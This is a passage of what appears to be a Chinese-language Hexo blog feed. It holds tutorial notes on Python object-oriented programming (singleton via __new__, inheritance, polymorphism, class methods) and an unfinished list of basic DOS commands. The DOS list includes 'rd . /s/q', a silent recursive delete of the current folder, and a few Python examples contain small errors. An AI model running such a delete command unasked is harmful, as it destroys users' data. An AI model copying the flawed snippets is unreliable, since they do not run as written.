class="headerlink" title="new 方法的重写"></a><strong>new</strong> 方法的重写</h4><p>重写的目的：当使用<font color="#fb8c00">类名()</font>创建对象时，无论使用多少次，在内存中只会创建出一个对象的实例</p><ul><li>重写<strong>new</strong> 方法一定要<font color="#fb8c00">return super().<strong>new</strong>(cls)</font></li></ul><h5 id="new-重写"><a href="#new-重写" class="headerlink" title="new 重写"></a><strong>new</strong> 重写</h5><pre class=" language-bash"><code class="language-bash">class musicPlayer<span class="token punctuation">(</span>object<span class="token punctuation">)</span>:    def __new__<span class="token punctuation">(</span>cls, *args, **kwargs<span class="token punctuation">)</span>:        <span class="token comment" spellcheck="true">#1.为对象分配空间</span>        instance <span class="token operator">=</span> super<span class="token punctuation">(</span><span class="token punctuation">)</span>.__new__<span class="token punctuation">(</span>cls<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#2. 返回对象的引用</span>        <span class="token keyword">return</span> instance    def __init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:        print<span class="token punctuation">(</span><span class="token string">"播放器初始化"</span><span class="token punctuation">)</span>player <span class="token operator">=</span> musicPlayer<span class="token punctuation">(</span><span class="token punctuation">)</span>print<span class="token punctuation">(</span>player<span class="token punctuation">)</span></code></pre><h5 id="单例模式中的new-重写"><a href="#单例模式中的new-重写" class="headerlink" title="单例模式中的new 重写"></a>单例模式中的<strong>new</strong> 重写</h5><pre class=" language-bash"><code class="language-bash">class musicPlayer<span class="token punctuation">(</span>object<span class="token punctuation">)</span>:    <span class="token comment" spellcheck="true">#记录第一个被创建对象的引用</span>    instance <span class="token operator">=</span> None    def __new__<span class="token punctuation">(</span>cls, *args, **kwargs<span class="token punctuation">)</span>:        <span class="token comment" spellcheck="true">#1.判断类属性是否是空对象，如果是空对象证明还没有创建对象</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cls.instance is None<span class="token punctuation">)</span>:            <span class="token comment" spellcheck="true">#2.调用父类的方法为第一个对象分配空间</span>            cls.instance <span class="token operator">=</span> super<span class="token punctuation">(</span><span class="token punctuation">)</span>.__new__<span class="token punctuation">(</span>cls<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#3.返回类属性保存的对象引用</span>        <span class="token keyword">return</span>  cls.instanceplayer1 <span class="token operator">=</span> musicPlayer<span class="token punctuation">(</span><span class="token punctuation">)</span>print<span class="token punctuation">(</span>player1<span class="token punctuation">)</span>player2 <span class="token operator">=</span> musicPlayer<span class="token punctuation">(</span><span class="token punctuation">)</span>print<span class="token punctuation">(</span>player2<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#输出结果： 输出结果player1 player2地址相同</span></code></pre><p>执行上述代码后，每一次创建的对象地址虽然相同，但是<strong>init</strong>初始化方法仍然会在每次创建对象时被调用，现在需要初始化方法只在最初创建时调用一次：</p><pre class=" language-bash"><code class="language-bash">class musicPlayer<span class="token punctuation">(</span>object<span class="token punctuation">)</span>:    <span class="token comment" spellcheck="true">#记录第一个被创建对象的引用</span>    instance <span class="token operator">=</span> None    <span class="token comment" spellcheck="true">#记录是否执行过初始化方法</span>    initFlag <span class="token operator">=</span> False    def __new__<span class="token punctuation">(</span>cls, *args, **kwargs<span class="token punctuation">)</span>:        <span class="token comment" spellcheck="true">#1.判断类属性是否是空对象，如果是空对象证明还没有创建对象</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>cls.instance is None<span class="token punctuation">)</span>:            <span class="token comment" spellcheck="true">#2.调用父类的方法为第一个对象分配空间</span>            cls.instance <span class="token operator">=</span> super<span class="token punctuation">(</span><span class="token punctuation">)</span>.__new__<span class="token punctuation">(</span>cls<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#3.返回类属性保存的对象引用</span>        <span class="token keyword">return</span>  cls.instance    def __init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:        <span class="token comment" spellcheck="true">#1. 判断是否执行过初始化方法</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>musicPlayer.initFlag <span class="token operator">==</span> True<span class="token punctuation">)</span>:            <span class="token keyword">return</span>        <span class="token comment" spellcheck="true">#2. 如果没有执行过则执行初始化方法</span>        print<span class="token punctuation">(</span><span class="token string">"初始化"</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#3. 修改类属性的值</span>        musicPlayer.initFlag <span class="token operator">=</span> Trueplayer1 <span class="token operator">=</span> musicPlayer<span class="token punctuation">(</span><span class="token punctuation">)</span>print<span class="token punctuation">(</span>player1<span class="token punctuation">)</span>player2 <span class="token operator">=</span> musicPlayer<span class="token punctuation">(</span><span class="token punctuation">)</span>print<span class="token punctuation">(</span>player2<span class="token punctuation">)</span></code></pre><p>上述代码虽创建了两次对象，但是初始化方法<strong>init</strong> 只被调用了一次。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> OOP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python(6)</title>
      <link href="/2019/12/05/python6/"/>
      <url>/2019/12/05/python6/</url>
      
        <content type="html"><![CDATA[<h2 id="面向对象三大特性"><a href="#面向对象三大特性" class="headerlink" title="面向对象三大特性"></a>面向对象三大特性</h2><ul><li>封装：根据职责将属性和方法封装到一个抽象的类中</li><li>继承：实现代码的重用，相同的代码不需要重复编写</li><li>多态：不同的对象调用相同的方法，产生不同的执行结果，增加代码的灵活度</li></ul><h2 id="dir内置函数"><a href="#dir内置函数" class="headerlink" title="dir内置函数"></a>dir内置函数</h2><p><strong>方法名</strong> :python提供的内置函数和属性<br>可以使用:</p><pre class=" language-bash"><code class="language-bash">dir<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#查看列表的内置函数和属性</span></code></pre><h2 id="定义类"><a href="#定义类" class="headerlink" title="定义类"></a>定义类</h2><h3 id="只包含方法"><a href="#只包含方法" class="headerlink" title="只包含方法"></a>只包含方法</h3><pre class=" language-bash"><code class="language-bash">class 类名：    def 方法1<span class="token punctuation">(</span>self,参数列表<span class="token punctuation">)</span>:        pass    def 方法2<span class="token punctuation">(</span>self,参数列表<span class="token punctuation">)</span>:        pass</code></pre><p>方法的定义格式与函数基本一样，区别在于方法的第一个参数必须是self，并且类名的命名方式必须是大驼峰命名法</p><h3 id="self参数"><a href="#self参数" class="headerlink" title="self参数"></a>self参数</h3><p>哪个对象调用该方法，self就指该对象：</p><pre class=" language-bash"><code class="language-bash">class Cat:    def eat<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:        print<span class="token punctuation">(</span><span class="token string">"%s eat fish"</span> %self.name<span class="token punctuation">)</span>tom <span class="token operator">=</span> Cat<span class="token punctuation">(</span><span class="token punctuation">)</span>tom.name <span class="token operator">=</span> <span class="token string">"Tom"</span>   <span class="token comment" spellcheck="true">#为tom增加name属性(不推荐)</span>tom.eat<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">#输出Tom eat fish</span>bob <span class="token operator">=</span> Catbob.name <span class="token operator">=</span><span class="token string">"Bob"</span>bob.eat<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出Bob eat fish</span></code></pre><h3 id="初始化方法"><a href="#初始化方法" class="headerlink" title="初始化方法"></a>初始化方法</h3><ol><li>当使用类名创建对象时，会自动执行以下操作：</li></ol><ul><li>为对象在内存中分配空间：创建对象</li><li>为对象的属性设置初始值：初始化方法(init)</li></ul><ol start="2"><li>这个初始化方法就是<strong>init</strong>方法,<strong>init</strong> 是对象的内置方法，<strong>init</strong> 方法是专门用来定义一个类具有哪些属性的方法<pre class=" language-bash"><code class="language-bash">class Cat: def __init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:     print<span class="token punctuation">(</span><span class="token string">"这是一个初始化方法"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 使用类名()创建对象时，会自动调用初始化方法__init__</span>tom <span class="token operator">=</span> Cat<span class="token punctuation">(</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#输出结果 这是一个初始化方法</span></code></pre></li></ol><h4 id="在初始化方法内部定义属性"><a href="#在初始化方法内部定义属性" class="headerlink" title="在初始化方法内部定义属性"></a>在初始化方法内部定义属性</h4><p>在<strong>init</strong>方法内部使用self.属性名=属性的初始值 就可以定义属性。在定义属性后，再使用该类创建对象，都会拥有该属性</p><pre class=" language-bash"><code class="language-bash">class Cat:    def __init__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:        self.name<span class="token operator">=</span><span class="token string">"Hello"</span>tom <span class="token operator">=</span> Cat<span class="token punctuation">(</span><span class="token punctuation">)</span>bob <span class="token operator">=</span> Cat<span class="token punctuation">(</span><span class="token punctuation">)</span>print<span class="token punctuation">(</span>tom.name<span class="token punctuation">)</span>print<span class="token punctuation">(</span>bob.name<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 输出结果</span>HelloHello</code></pre><h4 id="改造初始化方法"><a href="#改造初始化方法" class="headerlink" title="改造初始化方法"></a>改造初始化方法</h4><pre class=" language-bash"><code class="language-bash">class Cat:    def __init__<span class="token punctuation">(</span>self,name<span class="token punctuation">)</span>:        self.name<span class="token operator">=</span>nametom <span class="token operator">=</span> Cat<span class="token punctuation">(</span><span class="token string">"Tom"</span><span class="token punctuation">)</span>bob <span class="token operator">=</span> Cat<span class="token punctuation">(</span><span class="token string">"Bob"</span><span class="token punctuation">)</span>print<span class="token punctuation">(</span>tom.name<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#输出Tom</span>print<span class="token punctuation">(</span>bob.name<span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#输出Bob</span></code></pre><h3 id="内置方法和属性"><a href="#内置方法和属性" class="headerlink" title="内置方法和属性"></a>内置方法和属性</h3><h4 id="del-方法"><a href="#del-方法" class="headerlink" title="del 方法"></a><strong>del</strong> 方法</h4><ol><li>当一个对象被从内存中销毁时，自动调用<strong>del</strong>方法</li><li>如果希望对象在被销毁前再做一些事情，可以考虑<strong>del</strong> 方法</li><li>生命周期：</li></ol><ul><li>一个对象从调用类名()创建，生命周期开始</li><li>一个对象<strong>del</strong>对象一旦被调用，生命周期结束</li><li>在对象的生命周期内，可以访问对象属性，或者让对象调用方法</li></ul><h5 id="在代码执行结束后回收"><a href="#在代码执行结束后回收" class="headerlink" title="在代码执行结束后回收"></a>在代码执行结束后回收</h5><p>tom是全局变量，<strong>del</strong> 函数会在所有代码执行完毕后自动调用</p><pre class=" language-bash"><code class="language-bash">class Cat:    def __init__<span class="token punctuation">(</span>self,name<span class="token punctuation">)</span>:        self.name<span class="token operator">=</span>name    def __del__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:        print<span class="token punctuation">(</span><span class="token string">"%s 已销毁"</span>%self.name<span class="token punctuation">)</span>tom <span class="token operator">=</span> Cat<span class="token punctuation">(</span><span class="token string">"Tom"</span><span class="token punctuation">)</span>print<span class="token punctuation">(</span><span class="token string">"----------------------"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 输出结果</span>----------------------Tom已销毁</code></pre><h5 id="使用del方法删除对象"><a href="#使用del方法删除对象" class="headerlink" title="使用del方法删除对象"></a>使用del方法删除对象</h5><pre class=" language-bash"><code class="language-bash">class Cat:    def __init__<span class="token punctuation">(</span>self,name<span class="token punctuation">)</span>:        self.name<span class="token operator">=</span>name    def __del__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:        print<span class="token punctuation">(</span><span class="token string">"%s 已销毁"</span>%self.name<span class="token punctuation">)</span>tom <span class="token operator">=</span> Cat<span class="token punctuation">(</span><span class="token string">"Tom"</span><span class="token punctuation">)</span>del tomprint<span class="token punctuation">(</span><span class="token string">"----------------------"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 输出结果</span>Tom已销毁----------------------</code></pre><h4 id="str-方法"><a href="#str-方法" class="headerlink" title="str 方法"></a><strong>str</strong> 方法</h4><p>返回对象的描述信息,print函数输出使用，必须返回一个字符串</p><pre class=" language-bash"><code class="language-bash">class Cat:    def __init__<span class="token punctuation">(</span>self,name<span class="token punctuation">)</span>:        self.name<span class="token operator">=</span>name    def __del__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:        print<span class="token punctuation">(</span><span class="token string">"%s 已销毁"</span>%self.name<span class="token punctuation">)</span>tom <span class="token operator">=</span> Cat<span class="token punctuation">(</span><span class="token string">"Tom"</span><span class="token punctuation">)</span>print<span class="token punctuation">(</span>tom<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#输出结果</span><span class="token operator">&lt;</span>__main__.Cat object at 0x000002D897863B88<span class="token operator">></span>Tom 已销毁</code></pre><p>使用<strong>str</strong>方法后：</p><pre class=" language-bash"><code class="language-bash">class Cat:    def __init__<span class="token punctuation">(</span>self,name<span class="token punctuation">)</span>:        self.name<span class="token operator">=</span>name    def __del__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:        print<span class="token punctuation">(</span><span class="token string">"%s 已销毁"</span>%self.name<span class="token punctuation">)</span>    def __str__<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:        <span class="token keyword">return</span> <span class="token string">"hello world"</span>tom <span class="token operator">=</span> Cat<span class="token punctuation">(</span><span class="token string">"Tom"</span><span class="token punctuation">)</span>print<span class="token punctuation">(</span>tom<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 输出结果</span>hello worldTom 已销毁</code></pre><h2 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h2><ol><li>画类图</li><li>被使用的类应该先开发</li><li>类与类之间调用是通过对象实现的</li></ol><h2 id="身份运算符"><a href="#身份运算符" class="headerlink" title="身份运算符"></a>身份运算符</h2><p>身份运算符被用于比较两个对象的内存地址是否一致(是否是对同一个对象的引用)。在Python中对None比较时，建议使用is判断</p><ul><li>is： is是判断两个标识符是不是引用同一个对象。 x is y 类似id(x)==id(y)</li><li>is not： is not是判断两个标识符是不是引用不同对象。 x is not y 类似id(x)!=id(y)</li></ul><blockquote><p>注：id()是查看变量的内存地址</p></blockquote><h3 id="is和-的区别"><a href="#is和-的区别" class="headerlink" title="is和==的区别"></a>is和==的区别</h3><ul><li>is用于判断两个对象引用对象是否是同一个(比较地址)</li><li>==用于判断引用对象的值是否相等</li></ul><h2 id="私有属性和私有方法"><a href="#私有属性和私有方法" class="headerlink" title="私有属性和私有方法"></a>私有属性和私有方法</h2><p>私有属性和私有方法只能在对象的内部被访问，不能在外部进行访问</p><ul><li>私有属性：对象不希望公开的属性</li><li>私有方法：对象不希望公开的方法<br>定义方法，在属性名或方法名前加两个下划线</li></ul><h3 id="私有属性"><a href="#私有属性" class="headerlink" title="私有属性"></a>私有属性</h3><pre class=" language-bash"><code class="language-bash">class Woman:    def __init__<span class="token punctuation">(</span>self,name<span class="token punctuation">)</span>:        self.name <span class="token operator">=</span> name        self.__age <span class="token operator">=</span> 18    def secret<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:        print<span class="token punctuation">(</span><span class="token string">"%s的年龄为%d"</span> % <span class="token punctuation">(</span>self.name,self.__age<span class="token punctuation">))</span>   <span class="token comment" spellcheck="true">#true,在对象内部的方法可以访问私有属性</span>xiaofang <span class="token operator">=</span> Woman<span class="token punctuation">(</span><span class="token string">"小芳"</span><span class="token punctuation">)</span>print<span class="token punctuation">(</span>xiaofang.__age<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># false,在对象外部不能访问私有属性</span>xiaofang.secret<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="私有方法"><a href="#私有方法" class="headerlink" title="私有方法"></a>私有方法</h3><pre class=" language-bash"><code class="language-bash">class Woman:    def __init__<span class="token punctuation">(</span>self,name<span class="token punctuation">)</span>:        self.name <span class="token operator">=</span> name        self.__age <span class="token operator">=</span> 18    def __secret<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:        print<span class="token punctuation">(</span><span class="token string">"%s的年龄为%d"</span> % <span class="token punctuation">(</span>self.name,self.__age<span class="token punctuation">))</span>xiaofang <span class="token operator">=</span> Woman<span class="token punctuation">(</span><span class="token string">"小芳"</span><span class="token punctuation">)</span>xiaofang.__secret<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#error，在对象外部不能访问私有方法</span></code></pre><h4 id="伪私有属性和私有方法"><a href="#伪私有属性和私有方法" class="headerlink" title="伪私有属性和私有方法"></a>伪私有属性和私有方法</h4><p>Python中，并没有真正意义上的私有。在给属性、方法命名时，实际上是对名称做了一些特殊处理，使得外界无法访问。<br>可以使用以下方式访问私有属性和方法(在开发中不要使用这种方法访问私有属性和私有方法)</p><pre class=" language-bash"><code class="language-bash">class Woman:    def __init__<span class="token punctuation">(</span>self,name<span class="token punctuation">)</span>:        self.name <span class="token operator">=</span> name        self.__age <span class="token operator">=</span> 18    def __secret<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:        print<span class="token punctuation">(</span><span class="token string">"%s的年龄为%d"</span> % <span class="token punctuation">(</span>self.name,self.__age<span class="token punctuation">))</span>xiaofang <span class="token operator">=</span> Woman<span class="token punctuation">(</span><span class="token string">"小芳"</span><span class="token punctuation">)</span>print<span class="token punctuation">(</span>xiaofang._Woman__age<span class="token punctuation">)</span>xiaofang._Woman__secret<span class="token punctuation">(</span><span class="token punctuation">)</span> </code></pre><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><p>继承语法：</p><pre class=" language-bash"><code class="language-bash">class 类名<span class="token punctuation">(</span>父类名<span class="token punctuation">)</span>:     pass</code></pre><h3 id="继承的传递性"><a href="#继承的传递性" class="headerlink" title="继承的传递性"></a>继承的传递性</h3><p>如果B类继承A类，C类继承B类，则C类也继承自A类。子类可以访问父类的公共属性和方法。</p><h3 id="重用"><a href="#重用" class="headerlink" title="重用"></a>重用</h3><p>在子类中重写父类的同名方法，使用子类对象调用方法时，会调用子类中重写的方法。</p><h4 id="覆盖"><a href="#覆盖" class="headerlink" title="覆盖"></a>覆盖</h4><p>子类方法完全不同于父类的同名方法</p><pre class=" language-bash"><code class="language-bash">class Dog:    def bark<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:        print<span class="token punctuation">(</span><span class="token string">"汪汪汪"</span><span class="token punctuation">)</span>class Xiaotianquan<span class="token punctuation">(</span>Dog<span class="token punctuation">)</span>:    def bark<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:        print<span class="token punctuation">(</span><span class="token string">"可以说话"</span><span class="token punctuation">)</span>xiaotian <span class="token operator">=</span> Xiaotianquan<span class="token punctuation">(</span><span class="token punctuation">)</span>xiaotian.bark<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#输出结果 ： 可以说话</span></code></pre><h4 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h4><p>子类方法在父类同名方法的基础上再加上额外的属性。使用super().创建一个新的对象调用父类中封装的方法</p><pre class=" language-bash"><code class="language-bash">class Dog<span class="token punctuation">(</span>Animal<span class="token punctuation">)</span>:    def bark<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:        print<span class="token punctuation">(</span><span class="token string">"汪汪汪"</span><span class="token punctuation">)</span>class Xiaotianquan<span class="token punctuation">(</span>Dog<span class="token punctuation">)</span>:    def bark<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:        <span class="token comment" spellcheck="true">#1.针对子类的特殊需求，编写代码</span>        print<span class="token punctuation">(</span><span class="token string">"可以说话"</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#2. 使用super().调用原本在父类中封装的方法</span>        super<span class="token punctuation">(</span><span class="token punctuation">)</span>.bark<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#3. 增加其他子类的方法</span>        print<span class="token punctuation">(</span><span class="token string">"asdsadddd"</span><span class="token punctuation">)</span>xiaotian <span class="token operator">=</span> Xiaotianquan<span class="token punctuation">(</span><span class="token punctuation">)</span>xiaotian.bark<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 输出结果</span>可以说话汪汪汪asdsadddd</code></pre><h3 id="多继承"><a href="#多继承" class="headerlink" title="多继承"></a>多继承</h3><p>一个子类可以继承多个父类，并且拥有所有父类的属性和方法：</p><pre class=" language-bash"><code class="language-bash">class 类名<span class="token punctuation">(</span>父类名1，父类名2<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">)</span>:    pass</code></pre><p>如果在多个父类中具有同名的方法或属性，应避免使用多继承。</p><h4 id="MRO方法顺序"><a href="#MRO方法顺序" class="headerlink" title="MRO方法顺序"></a>MRO方法顺序</h4><p>在多继承中可以使用类的内置属性<strong>mro</strong>查看方法的调用顺序</p><pre class=" language-bash"><code class="language-bash">class A:    passclass B:    passclass C:    passclass D<span class="token punctuation">(</span>C,B,A<span class="token punctuation">)</span>:    passprint<span class="token punctuation">(</span>D.__mro__<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#输出结果 </span><span class="token punctuation">(</span><span class="token operator">&lt;</span>class <span class="token string">'__main__.D'</span><span class="token operator">></span>, <span class="token operator">&lt;</span>class <span class="token string">'__main__.C'</span><span class="token operator">></span>, <span class="token operator">&lt;</span>class <span class="token string">'__main__.B'</span><span class="token operator">></span>, <span class="token operator">&lt;</span>class <span class="token string">'__main__.A'</span><span class="token operator">></span>, <span class="token operator">&lt;</span>class <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#结果中显示的顺序即对方法和属性查找的顺序</span></code></pre><blockquote><p>注：Object类是所有类的基类</p></blockquote><h2 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h2><p>不同的子类对象调用相同的父类方法，产生不同的执行结果</p><pre class=" language-bash"><code class="language-bash">class Dog:    def __init__<span class="token punctuation">(</span>self,name<span class="token punctuation">)</span>:        self.name <span class="token operator">=</span> name    def game<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:        print<span class="token punctuation">(</span><span class="token string">"%s正在玩耍"</span> %<span class="token punctuation">(</span>self.name<span class="token punctuation">))</span>class Xiaotianquan<span class="token punctuation">(</span>Dog<span class="token punctuation">)</span>:    def game<span class="token punctuation">(</span>self<span class="token punctuation">)</span>:        print<span class="token punctuation">(</span><span class="token string">"%s正在巡查公务"</span> % <span class="token punctuation">(</span>self.name<span class="token punctuation">))</span>class Person:    def __init__<span class="token punctuation">(</span>self,personName<span class="token punctuation">)</span>:        self.personName <span class="token operator">=</span> personName    def playWith<span class="token punctuation">(</span>self,dog<span class="token punctuation">)</span>:        print<span class="token punctuation">(</span><span class="token string">"%s与%s正在玩耍"</span> % <span class="token punctuation">(</span>self.personName,dog.name<span class="token punctuation">))</span>        dog.game<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#传递不同的对象产生不同的结果</span>person <span class="token operator">=</span> Person<span class="token punctuation">(</span><span class="token string">"小明"</span><span class="token punctuation">)</span>dog <span class="token operator">=</span> Dog<span class="token punctuation">(</span><span class="token string">"旺财"</span><span class="token punctuation">)</span>person.playWith<span class="token punctuation">(</span>dog<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#输出结果</span>小明与旺财正在玩耍旺财正在玩耍xiao <span class="token operator">=</span> Xiaotianquan<span class="token punctuation">(</span><span class="token string">"哮天犬"</span><span class="token punctuation">)</span>person.playWith<span class="token punctuation">(</span>xiao<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#输出结果</span>小明与哮天犬正在玩耍哮天犬正在巡查公务</code></pre><h2 id="类对象"><a href="#类对象" class="headerlink" title="类对象"></a>类对象</h2><p>在Python中，类也是一个对象，由类创建的对象叫做实例对象</p><h3 id="类属性"><a href="#类属性" class="headerlink" title="类属性"></a>类属性</h3><p>类属性就是给类对象定义的属性，通常用来记录这个类相关的特征</p><p>一个工具类，需要统计所有该类创建的实例对象的数量</p><pre class=" language-bash"><code class="language-bash">class Tool<span class="token punctuation">(</span>object<span class="token punctuation">)</span>:    count <span class="token operator">=</span> 0    def __init__<span class="token punctuation">(</span>self,name<span class="token punctuation">)</span>:        self.name <span class="token operator">=</span> name        <span class="token comment" spellcheck="true"># 让类属性加1</span>        Tool.count+<span class="token operator">=</span>1tool1 <span class="token operator">=</span> Tool<span class="token punctuation">(</span><span class="token string">"斧头"</span><span class="token punctuation">)</span>tool2 <span class="token operator">=</span> Tool<span class="token punctuation">(</span><span class="token string">"铲子"</span><span class="token punctuation">)</span>print<span class="token punctuation">(</span>Tool.count<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 输出结果 ：2</span></code></pre><h3 id="类方法"><a href="#类方法" class="headerlink" title="类方法"></a>类方法</h3><p>针对类对象定义的方法,语法如下：</p><pre class=" language-bash"><code class="language-bash">@classmethod   <span class="token comment" spellcheck="true">#告诉解释器这是一个类方法</span>def 类方法名<span class="token punctuation">(</span>cls<span class="token punctuation">)</span>: <span class="token comment" spellcheck="true">#第一个参数必须是cls</span>    pass</code></pre><p>实例：使用一个类方法打印输出创建的工具个数</p><pre class=" language-bash"><code class="language-bash">class Tool<span class="token punctuation">(</span>object<span class="token punctuation">)</span>:    count <span class="token operator">=</span> 0    def __init__<span class="token punctuation">(</span>self,name<span class="token punctuation">)</span>:        self.name <span class="token operator">=</span> name        <span class="token comment" spellcheck="true"># 让类属性加1</span>        Tool.count+<span class="token operator">=</span>1    @classmethod    def showToolCount<span class="token punctuation">(</span>cls<span class="token punctuation">)</span>:        print<span class="token punctuation">(</span><span class="token string">"已经创立了%d个工具"</span> % <span class="token punctuation">(</span>cls.count<span class="token punctuation">))</span>tool1 <span class="token operator">=</span> Tool<span class="token punctuation">(</span><span class="token string">"斧头"</span><span class="token punctuation">)</span>tool2 <span class="token operator">=</span> Tool<span class="token punctuation">(</span><span class="token string">"铲子"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#类方法只能通过类名调用，cls不需要传递，解释器会自动传递</span>Tool.showToolCount<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#输出结果：已经创立了2个工具</span></code></pre><h3 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h3><p>如果一个方法同时满足以下两个条件：</p><ul><li>不需要访问实例属性或调用实例方法</li><li>不需要访问类属性或调用类方法<br>那么该方法可以封装成一个静态方法，语法如下：<pre class=" language-bash"><code class="language-bash">@staticmethoddef 静态方法名<span class="token punctuation">(</span><span class="token punctuation">)</span>:  pass</code></pre>调用方式与类方法调用方法相同，都不需要创建对象</li></ul><h3 id="方法分类："><a href="#方法分类：" class="headerlink" title="方法分类："></a>方法分类：</h3><ul><li>实例方法：在方法内部需要访问实例属性(实例方法内部可以使用类名访问类属性)</li><li>类方法：方法内部只需要访问类属性</li><li>静态方法：方法内部，不需要访问实例属性和类属性</li></ul>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> OOP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DOS</title>
      <link href="/2019/12/01/dos/"/>
      <url>/2019/12/01/dos/</url>
      
        <content type="html"><![CDATA[<h2 id="DOS"><a href="#DOS" class="headerlink" title="DOS"></a>DOS</h2><p>DOS(Disk Operating System,磁盘操作系统)，是一个基于磁盘管理的、单用户单任务的操作系统。</p><h3 id="DOS命令分类"><a href="#DOS命令分类" class="headerlink" title="DOS命令分类"></a>DOS命令分类</h3><ol><li>内部命令：是DOS命令中常驻内存的一部分，它是在当系统冷、热启动时由磁盘上的系统文件装入内存的，用户使用时仅仅时调用内存中系统区的某一个程序段来执行。</li><li>外部命令：以可执行的程序文件形式(后缀通常为.exe或.com)存在磁盘上，也就是说该命令文件必须记录在磁盘或已插入驱动器的软盘上，否则DOS是找不到命令的。</li><li>批处理命令：在使用磁盘命令过程中，有时需要连续使用几条DOS命令，有时又要重复使用若干条DOS命令，有时还需要有选择地使用某些DOS命令，为了满足这些要求，DOS提供了一些特殊文件(后缀为.bat的文件)，该文件允许用户组织键盘命令语言程序，一次建立，多次执行。</li></ol><h2 id="DOS基本知识"><a href="#DOS基本知识" class="headerlink" title="DOS基本知识"></a>DOS基本知识</h2><h3 id="盘符"><a href="#盘符" class="headerlink" title="盘符"></a>盘符</h3><p>盘符，就是硬盘分区在DOS状态下的一个字母提示符。<br><img src="https://pic.downk.cc/item/5e8adb18504f4bcb04f0b56a.png" alt=""></p><h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul><li>在硬盘里，目录和文件夹都是一个树形结构。在DOS下，最底层的目录，是根目录。</li><li>DOS下目录的表示符号(分隔符)是“\”，通常将根目录定义为“\”,\txt\doc的意思就是从根目录起，第一级子目录为txt,第二级子目录为doc</li></ul><h2 id="DOS基本命令"><a href="#DOS基本命令" class="headerlink" title="DOS基本命令"></a>DOS基本命令</h2><h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><ol><li><font color="#fb8c00">cd \ </font> 返回根目录</li><li><font color="#fb8c00">cd ..</font>返回到上一级目录</li><li><font color="#fb8c00">echo</font> 输出，如果大于符号指向文本，表示将内容写入到文本的意思</li></ol><pre class=" language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">"hello world"</span> <span class="token operator">></span> test.txt</code></pre><ol start="4"><li><font color="#fb8c00">exit</font> 退出DOS</li><li><font color="#fb8c00">type 文件名.扩展名</font> 显示文件内容</li><li><font color="#fb8c00">cls</font> 当前命令清空</li><li><font color="#fb8c00">rd . /s/q</font>删除文件夹和文件夹里的所有文件和文件夹</li><li><font color="#fb8c00">del 文件名.扩展名</font> 删除文件</li><li><font color="#fb8c00">dir /a</font> 